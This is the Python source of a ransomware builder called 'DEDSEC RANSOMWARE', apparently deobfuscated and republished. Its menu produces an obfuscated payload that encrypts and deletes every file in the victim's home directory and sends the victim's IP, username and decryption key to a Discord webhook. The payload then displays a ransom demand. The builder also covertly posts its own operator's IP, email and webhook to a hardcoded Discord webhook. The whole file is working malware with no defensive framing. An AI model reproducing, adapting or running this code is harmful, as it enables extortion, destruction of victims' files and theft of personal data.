
# DEOBFUSCATED BY -> ZELROTH
# GITHUB -> https://github.com/xelroth

import requests
import re, os, sys, time
from pystyle import *
from tabulate import tabulate

ip = requests.get('https://api.ipify.org').text

user = os.getlogin()

def check_internet_connection():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

def create_payload(email, webhook):
    part_1 = r'''
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os, sys
import platform
import psutil
import base64
import hashlib
import warnings
warnings.filterwarnings('ignore')
import requests
import time

dark_green = '\033[32m'
reset_color = '\033[0m'
console_width = 80

ip = requests.get('https://api.ipify.org').text

user = os.getlogin()

payload_filename = os.path.basename(__file__)

def check_internet_connection():
    try:
        response = requests.get("http://www.google.com", timeout=5)
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False

def get_hardware_info():
    system_info = platform.uname()
    memory_info = psutil.virtual_memory()
    disk_info = psutil.disk_usage('/')
    sys: str = (f"{system_info.system}")
    user: str = (f"{system_info.node}")
    rel: str = (f"{system_info.release}")
    arch: str = (f"{system_info.machine}")
    mem: str = (f"{memory_info.total}")
    store: str = (f"{disk_info.total}")
    unique_key = f'{sys}{user}{rel}{arch}{mem}{store}'
    return unique_key

unique_id: str = (get_hardware_info())

license_format = base64.b64encode(unique_id.encode()).decode()
decoded_data = base64.b64decode(license_format).decode()
secret_code = "GludXhsb2NhbGhvc3Q2LjUuMC1rYWxpMi1hbWQ2NHg4Nc3Q2LjUuMC1rYWxpMi1hbWQ2NHg4Nc3Q2LjUuMC1rYWxpMi1hbWQ2NHg4Nc3Q2LjUuMC1rYWxpMi1hbWQ2NHg4Nl82NDE2MTM0ODExNjQ4NTAxMzg2MDQzMzky"

def generate_license(decoded_data, secret_code):
    combined_code = decoded_data + secret_code
    hashed_code = hashlib.sha256(combined_code.encode()).hexdigest()
    return hashed_code

generated_license = generate_license(decoded_data, secret_code)

def send_data():
        '''
    part_2 = f'''
    webhook_url = '{webhook}'
    '''
    part_3 = r"""
    payload = {
    "content": None,
    "embeds": [
        {
            "title": "DEDSEC RANSOMWARE",
            "description": "Dedsec ransomware tool by 0xbit",
            "fields": [
                {"name": 'UNIQUE ID', "value": license_format, "inline": True},
                {"name": 'PUBLIC IP', "value": ip, "inline": False},
                {"name": 'USERNAME', "value": user, "inline": False},
                {"name": 'DECRYPTION KEY', "value": generated_license, "inline": False}
            ],
            "footer": {"text": "Coded by 0xbit"},
            "thumbnail": {"url": "https://media0.giphy.com/media/l0IynvAIYxm8ZGUrm/giphy.gif?cid=ecf05e47qvbyv5iod2z91r9bufnpkvsjn1xm18a63b0g8z9a&ep=v1_gifs_related&rid=giphy.gif&ct=g"}
        }
    ],
    "username": "dedsec",
    "avatar_url": "https://avatars.githubusercontent.com/u/74537225?v=4"
}

    response = requests.post(webhook_url, json=payload)

def derive_key(password, salt, iterations=100000):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        salt=salt,
        length=32,
        iterations=iterations,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def decrypt_file(encrypted_file_path, key):
    with open(encrypted_file_path, 'rb') as encrypted_file:
        iv = encrypted_file.read(16)
        encrypted_data = encrypted_file.read()

    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    decrypted_file_path = encrypted_file_path.replace('.dedsec', '')
    with open(decrypted_file_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)

    os.remove(encrypted_file_path)

def decrypt_files_in_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for filename in files:
            encrypted_file_path = os.path.join(root, filename)

            if encrypted_file_path.endswith('.dedsec') and os.path.isfile(encrypted_file_path):
                decrypt_file(encrypted_file_path, key)


def is_file_encrypted(file_path):
    return file_path.endswith('.dedsec')

def encrypt_file(file_path, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())

    with open(file_path, 'rb') as file:
        file_data = file.read()

    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(file_data) + encryptor.finalize()

    with open(file_path + '.dedsec', 'wb') as encrypted_file:
        encrypted_file.write(iv + encrypted_data)

    os.remove(file_path)

def encrypt_files_in_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)

            if os.path.isfile(file_path) and not is_file_encrypted(file_path):
                if filename != payload_filename:
                    encrypt_file(file_path, key)
                    pass
                else:
                    pass
            else:
                pass

def ransom_message(unique_id, email):
    os.system('clear')
    banner_down = r'''

                                                        ⣀⣠⣤⣤⣤⣤⣀⡀
                                                    ⣠⣤⢶⣻⣿⣻⣿⣿⣿⣿⣿⣿⣦⣤⣀
                                                   ⣼⣺⢷⣻⣽⣾⣿⢿⣿⣷⣿⣿⢿⣿⣿⣿⣇
                                                 ⠠⡍⢾⣺⢽⡳⣻⡺⣽⢝⢗⢯⣻⢽⣻⣿⣿⣿⣿⢿⡄
                                                 ⡨⣖⢹⠜⢅⢫⢊⢎⠜⢌⠣⢑⠡⣹⡸⣜⣯⣿⢿⣻⣷
                                                 ⢜⢔⡹⡭⣪⢼⠽⠷⠧⣳⢘⢔⡝⠾⠽⢿⣷⣿⣟⢷⣟
                                                 ⢸⢘⢼⠿⠟⠁⠄⠄⡀⠄⠃⠑⡌⠄⠄⠈⠙⠿⣷⢽⣻
                                                 ⢌⠂⠅⠄⠄⠄⠄⠄⠄⡀⣲⣢⢂⠄⠄⠄⠄⠄⠈⣯⠏
                                                 ⠐⠨⡂⠄⠄⠄⠄⠄⡀⡔⠋⢻⣤⡀⠄⠄⢀⠄⢸⣯⠇
                                                 ⠈⣕⠝⠒⠄⠄⠒⢉⠪⠄⠄⠄⢿⠜⠑⠢⠠⡒⡺⣿⠖
                                                  ⠐⠅⠁⡀⠄⠐⢔⠁⠄⠄⠄⢀⢇⢌⠄⠄⠄⠸⠕
                                                   ⠂⠄⠄⠨⣔⡝⠼⡄⠂⣦⡆⣿⣲⠐⠑⠁⠄⠃
                                                       ⠃⢫⢛⣙⡊⣜⣏⡝⣝⠆
                                                       ⠈⠈⠈⠁⠁⠁⠈⠈⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                   DEDSEC RANSOMWARE
'''
    console_width = os.get_terminal_size().columns
    left_padding = (console_width - len(banner_down)) // 2
    print(' ' * left_padding + banner_down)

    message = f'''
                                        Oops! Your files have been encrypted.

                            If you see this text, your files are no longer accessible,
                            You might have been looking for a way to recover your files,
                Don't waste you time. No one will be able to recover them without our decryption service.

We guarentee that you can recover all your files safely. All you need to do is submit the payment and get the decryption key.

        CONTACT THIS EMAIL: {email}
        YOUR UNIQUE ID: {unique_id}

ATTENTION:

   [!] do not rename encrypted files.
   [!] do not try to decrypt your data using third party software, it may cause permanent data loss.


If you already purchased your key, please enter it below.
    '''
    left_padding = (console_width - len(message)) // 2
    print(dark_green + ' ' * left_padding + message + reset_color)

def start():
    if not check_internet_connection():
        print("No internet connection.")
        sys.exit(2)

    password = 'dedsec1da0b2abfcc58713bc8dd18ab16d9b9a9885ff813535ccd1e462fe7b979fd7871da0b2abfcc58713bc8dd18ab16d9b9a9885ff813535ccd1e462fe7b979fd787'
    salt = b'1da0b2abfcc58713bc8dd18ab16d9b9a9885ff813535ccd1e462fe7b979fd7871da0b2abfcc58713bc8dd18ab16d9b9a9885ff813535ccd1e462fe7b979fd787'

    key = derive_key(password, salt)
    directory_path = f'/home/{user}/'
    encrypt_files_in_directory(directory_path, key)
    send_data()
    """

    part_4 = f'''
    ransom_message(license_format, '{email}')
    '''

    part_5 = r'''
    try:
        DECRYPTION_KEY = input('DECRYPTION KEY: ')
        if DECRYPTION_KEY == generated_license:
            decrypt_files_in_directory(directory_path, key)
            print('\nYOUR FILES HAVE BEEN SUCCESSFULLY DECRYPTED.\n')
        else:
            print('\nINVALID KEY\n')
            time.sleep(2)
            start()
    except:
        start()

start()

    '''

    payloads = [
        part_1,
        part_2,
        part_3,
        part_4,
        part_5
    ]

    class CreatePayload:
        def __init__(self, filename='/tmp/.p'):
            self.filename = filename

        def create_payload_code(self):
            with open(self.filename, 'a') as append_data:
                for payload in payloads:
                    append_data.write(payload + '\n')

    creator = CreatePayload()
    creator.create_payload_code()

def read_python_code_from_file(file_path):
    with open(file_path, 'r') as file:
        return file.read()

def obfux():
    try:
        with open('.w.txt', 'r'):
            pass
    except FileNotFoundError:
        with open('.w.txt', 'w'):
            pass

    with open('.w.txt', 'r') as f:
            webhook = f.readline().strip()
            if not webhook:
                print()
                table = tabulate([["ADD WEBHOOK LINK FIRST"]], tablefmt="fancy_grid")
                centered_table = "\n".join([" " * ((80 - len(line)) // 2) + line for line in table.split("\n")])
                print(centered_table)
                time.sleep(3)
                return menu()
            else:
                pass
            f.close()

    if not check_internet_connection():
        print(tabulate([['No internet connection. Please connect to the internet.']], tablefmt='fancy_grid'))

    else:
        email = input('\t [?] EMAIL: ')
        file_name = input('\t [?] PAYLOAD NAME: ')

        create_payload(email, webhook)
        send_data_fuser(file_name, ip, user, email, webhook)

        try:
            python_code = read_python_code_from_file('/tmp/.p')

            url = "https://pyobfuscate.com/pyd"
            params = {"input_text": python_code}

            response = requests.post(url, data=params)

            if response.status_code == 200:

                content = response.text

                match = re.search(r'id="myTextarea2">(.*?)<\/textarea>', content, re.DOTALL)

                if match:
                    obfuscated_code = match.group(1).strip()

                    obfuscated_code = obfuscated_code.replace('&#34;', '"')
                    obfuscated_code = obfuscated_code.replace('&#39;', "'")
                    obfuscated_code = obfuscated_code.replace('&amp;', "&")
                    obfuscated_code = obfuscated_code.replace('&lt;', "<")
                    obfuscated_code = obfuscated_code.replace('&gt;', ">")
                    obfuscated_code = obfuscated_code.replace('#pip install pycryptodome  , It works only v3.11 Above.', "")
                    obfuscated_code = "warnings.filterwarnings('ignore')\n" + obfuscated_code
                    obfuscated_code = "import warnings\n" + obfuscated_code
                    obfuscated_code = "#sudo pip install pycryptodome  , It works only v3.11 Above.\n" + obfuscated_code

                    with open(f'{file_name}.py', 'w') as f:
                        f.write(obfuscated_code)
                        os.remove('/tmp/.p')

                    table = tabulate([[f'Ransomware saved as {file_name}.py']], tablefmt="fancy_grid")
                    centered_table = "\n".join([" " * ((80 - len(line)) // 2) + line for line in table.split("\n")])
                    print(centered_table)

                else:
                    table = tabulate([["Couldn't find the ransomware code"]], tablefmt="fancy_grid")
                    centered_table = "\n".join([" " * ((80 - len(line)) // 2) + line for line in table.split("\n")])
                    print(centered_table)
            else:
                table = tabulate([["Failed to load ransomware code."]], tablefmt="fancy_grid")
                centered_table = "\n".join([" " * ((80 - len(line)) // 2) + line for line in table.split("\n")])
                print(centered_table)

        except FileNotFoundError:
            table = tabulate([[f"The file was not found."]], tablefmt="fancy_grid")
            centered_table = "\n".join([" " * ((80 - len(line)) // 2) + line for line in table.split("\n")])
            print(centered_table)


def send_data_fuser(payload_name, ip, user, email, webhook):
    payload = {
        "content": None,
        "embeds": [
            {
                "title": "DEDSEC RANSOMWARE",
                "description": "Dedsec ransomware tool by 0xbit DEOBFUSCATED BY ZELROTH",
                "fields": [
                    {"name": 'RANSOMWARE NAME', "value": payload_name, "inline": False},
                    {"name": 'PUBLIC IP', "value": ip, "inline": False},
                    {"name": 'USERNAME', "value": user, "inline": False},
                    {"name": 'EMAIL', "value": email, "inline": False},
                    {"name": 'WEBHOOK', "value": webhook, "inline": False}
                ],
                "footer": {"text": "Coded by 0xbit -> DEOBFUSCATED BY ZELROTH"},
                "thumbnail": {"url": "https://media0.giphy.com/media/l0IynvAIYxm8ZGUrm/giphy.gif?cid=ecf05e47qvbyv5iod2z91r9bufnpkvsjn1xm18a63b0g8z9a&ep=v1_gifs_related&rid=giphy.gif&ct=g"}
            }
        ],
        "username": "dedsec",
        "avatar_url": "https://avatars.githubusercontent.com/u/74537225?v=4"
    }

    response = requests.post('https://discord.com/api/webhooks/1172456340560560180/KwaMHIPwjfbQIhVUB-mOHNRiHoNnyAzzQcvgvjJHqGAfLSXahTDKwB1SVuq__NVlPbeQ', json=payload)


def setup_webhook():
    file_name = ".w.txt"
    try:
        with open(file_name, 'r') as web_link:
            content = web_link.read()
            if not content.strip():
                print()

                print(tabulate([[f'CURRENT WEBHOOK: ','EMPTY']], tablefmt='fancy_grid'))
                try:
                    weblink = input("\n    Enter a Discord webhook URL: ")
                    if not weblink.strip():
                        menu()
                except KeyboardInterrupt:
                    menu()
                if validate_webhook(weblink):
                    print("\n    [VALID]")
                    with open(f'.w.txt', 'w') as web:
                        web.write(weblink)
                    time.sleep(2)
                else:
                    print("\n    [INVALID]")
                    time.sleep(2)
                    return setup_webhook()
                menu()
            else:
                print()
                print(tabulate([[f'CURRENT WEBHOOK: ',f'{content}']], tablefmt='fancy_grid'))
                try:
                    weblink = input("\n    Enter a New Discord webhook URL: ")
                    if not weblink.strip():
                        menu()
                except KeyboardInterrupt:
                    menu()
                if validate_webhook(weblink):
                    print("\n    [VALID]")
                    with open(f'.w.txt', 'w') as web:
                        web.write(weblink)
                    time.sleep(2)
                else:
                    print("\n    [INVALID]")
                    time.sleep(2)
                menu()
    except FileNotFoundError:
        with open(file_name, 'w') as f:
            f.write('')
            f.close()
        return setup_webhook()

def validate_webhook(url):
    pattern = r'^https://(?:discord\.com|discordapp\.com)/api/webhooks/\d+/\w+(?:-\w+)*$'
    return bool(re.match(pattern, url))

dark = Col.dark_gray
green = Colors.StaticMIX((Col.green, Col.black))

banner_down = r'''
                                     ⣀⣠⣤⣤⣤⣤⣀⡀
                                 ⣠⣤⢶⣻⣿⣻⣿⣿⣿⣿⣿⣿⣦⣤⣀
                                ⣼⣺⢷⣻⣽⣾⣿⢿⣿⣷⣿⣿⢿⣿⣿⣿⣇
                              ⠠⡍⢾⣺⢽⡳⣻⡺⣽⢝⢗⢯⣻⢽⣻⣿⣿⣿⣿⢿⡄
                              ⡨⣖⢹⠜⢅⢫⢊⢎⠜⢌⠣⢑⠡⣹⡸⣜⣯⣿⢿⣻⣷
                              ⢜⢔⡹⡭⣪⢼⠽⠷⠧⣳⢘⢔⡝⠾⠽⢿⣷⣿⣟⢷⣟
                              ⢸⢘⢼⠿⠟⠁⠄⠄⡀⠄⠃⠑⡌⠄⠄⠈⠙⠿⣷⢽⣻
                              ⢌⠂⠅⠄⠄⠄⠄⠄⠄⡀⣲⣢⢂⠄⠄⠄⠄⠄⠈⣯⠏
                              ⠐⠨⡂⠄⠄⠄⠄⠄⡀⡔⠋⢻⣤⡀⠄⠄⢀⠄⢸⣯⠇
                              ⠈⣕⠝⠒⠄⠄⠒⢉⠪⠄⠄⠄⢿⠜⠑⠢⠠⡒⡺⣿⠖
                               ⠐⠅⠁⡀⠄⠐⢔⠁⠄⠄⠄⢀⢇⢌⠄⠄⠄⠸⠕
                                ⠂⠄⠄⠨⣔⡝⠼⡄⠂⣦⡆⣿⣲⠐⠑⠁⠄⠃
                                    ⠃⢫⢛⣙⡊⣜⣏⡝⣝⠆
                                    ⠈⠈⠈⠁⠁⠁⠈⠈⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀
'''

banner1 = '''
                                [ coded by 0xbit ] -> DEOBFUSCATED BY ZELROTH

        \033[38;2;0;100;0m [1]. \033[38;2;0;100;0m\033[48;2;0;100;0m\033[38;2;0;0;0m RANSOMWARE \033[0m\033[38;2;0;100;0m \033[0m
        \033[38;2;0;0;100m [2]. \033[38;2;0;0;100m\033[48;2;0;0;100m\033[38;2;0;0;0m WEBHOOK \033[0m\033[38;2;0;0;100m \033[0m
        \033[38;2;100;0;0m [0]. \033[38;2;0;0;0m\033[48;2;100;0;0m\033[38;2;0;0;0m EXIT  \033[0m\033[38;2;100;0;0m \033[0m
'''

def menu():
    os.system('clear')
    print(Colorate.Diagonal(Colors.DynamicMIX((green, dark)), banner_down))
    print('\033[38;2;0;100;0m\t\t\t      [ \033[38;2;0;100;0m\033[48;2;0;100;0m\033[38;2;0;0;0m DEDSEC RANSOMWARE \033[0m\033[38;2;0;100;0m ]\033[0m')
    print(((green)), (banner1))
    print(((green)), (''))
    select = input('\t [?] DEDSEC: ')
    if select == '1':
        obfux()
    elif select == '2':
        setup_webhook()
    elif select == '0':
        sys.exit('\n\t BYE BYE!')

menu()

